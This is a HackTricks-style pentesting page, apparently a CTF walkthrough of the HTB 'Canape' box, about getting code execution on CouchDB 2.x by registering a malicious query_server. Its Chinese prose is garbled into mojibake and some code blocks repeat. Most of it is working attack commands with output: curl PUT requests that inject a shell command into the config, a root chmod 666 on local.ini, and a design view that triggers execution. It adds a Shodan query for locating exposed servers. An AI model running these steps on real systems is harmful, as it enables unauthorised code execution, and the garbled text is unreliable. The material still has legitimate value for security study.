æˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªæ–°çš„query\_serverï¼Œç„¶åè°ƒç”¨å®ƒã€‚å½“Canapeå‘å¸ƒæ—¶ï¼Œå¤§å¤šæ•°POCéƒ½æ˜¯é’ˆå¯¹couchdb 1.xçš„ï¼Œä½†æ˜¯è¿™ä¸ªç›’å­æ­£åœ¨è¿è¡Œ2.xï¼Œæ‰€ä»¥å¤§å¤šæ•°POCçš„query\_serversè·¯å¾„ä¸å­˜åœ¨ã€‚ç°åœ¨å·²ç»æ”¹å˜äº†ï¼Œä½†æˆ‘ä»¬å°†æŒ‰ç…§ç›¸åŒçš„æ­¥éª¤è¿›è¡Œã€‚é¦–å…ˆï¼Œè·å–ç‰ˆæœ¬ï¼Œå¹¶æ˜¾ç¤º1.Xè·¯å¾„ä¸å­˜åœ¨ï¼š
```bash
www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}
```
æ›´æ–°ä¸º2.0çš„æ–°è·¯å¾„ï¼š
```bash
www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}
```
ä»é‚£é‡Œï¼Œæˆ‘ä»¬åº”è¯¥æ·»åŠ ä¸€ä¸ªquery\_serverç„¶åè°ƒç”¨å®ƒï¼Œä½†æˆ‘ä»¬æ— æ³•åšåˆ°ã€‚
```bash
www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}
```
ä¸€äº›è°·æ­Œæœç´¢æ˜¾ç¤ºè¿™æ˜¯ä¸€ä¸ªæƒé™é—®é¢˜ã€‚å®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨root shellæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¼šå‘ç°`local.ini`æ–‡ä»¶ä¸å¯å†™ï¼Œç”šè‡³ä¸å¯è¢«ä»»ä½•äººå†™å…¥ï¼Œæ›´ä¸ç”¨è¯´www-dataäº†ï¼š
```
root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini
```
æ‰€ä»¥å¯¹äºCanapeæ¥è¯´ï¼Œè¿™æ˜¯ä¸ªæ­»èƒ¡åŒã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³å°è¯•è®©å®ƒå·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„rootæˆ–homerè®¿é—®æƒé™ä½¿å…¶å¯è¯»ï¼Œå¹¶ç»§ç»­æ²¿ç€è¿™æ¡è·¯å¾„å‰è¿›ã€‚æˆ‘ä»¬å°†å¤‡ä»½åŸå§‹æ–‡ä»¶ä»¥ä¾¿æŸ¥çœ‹æ›´æ”¹å†…å®¹ï¼š
```
root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini
```
ç°åœ¨ï¼Œå›åˆ°æˆ‘ä»¬çš„www-data shellï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

```
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```
æˆ‘ä»¬å¾—åˆ°äº†cmdæŸ¥è¯¢æœåŠ¡å™¨çš„å…ˆå‰å€¼ï¼Œè¿™æ„å‘³ç€æˆåŠŸã€‚åœ¨root shellä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒèµ·ä½œç”¨äº†ï¼š
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =
```
ç°åœ¨ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œç„¶ååœ¨è¯¥æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªæ–‡æ¡£ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªå°†æˆ‘ä»¬çš„query\_serveræ˜ å°„åˆ°æ‰§è¡Œçš„è§†å›¾æ¥è¯·æ±‚å®ƒã€‚

åˆ›å»ºæ•°æ®åº“å’Œæ–‡æ¡£ï¼š
```bash
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

```
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```
åœ¨ä¸€ä¸ªè§†å›¾ä¸­è¯·æ±‚å®ƒï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}' -H "Content-Type: application/json"
```
#### [æ‘˜è¦](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0) ä½¿ç”¨ä¸åŒçš„æœ‰æ•ˆè½½è·

## Shodan

* `port:5984 couchdb`

## å‚è€ƒèµ„æ–™

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆâ€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
